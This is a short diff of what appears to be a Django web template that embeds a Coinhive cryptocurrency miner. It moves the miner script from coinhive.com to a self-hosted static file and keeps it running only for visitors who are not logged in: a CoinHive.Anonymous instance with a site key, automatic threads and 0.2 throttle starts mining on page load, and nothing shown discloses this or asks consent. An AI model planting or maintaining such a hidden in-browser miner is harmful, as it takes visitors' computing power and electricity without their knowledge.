@@ -1,10 +1,11 @@
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>	
-    {% if not login %}
+{% load staticfiles %}
+{% if not login %}
+    <script defer src="{% static "coinhive.min.js" %}"></script>
+    <script>
         var miner = new CoinHive.Anonymous('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c',{
             autoThreads: true,
             throttle: 0.2
         });
-        miner.start();
-    {% endif %}
-</script>
+    miner.start();
+    </script>
+{% endif %}
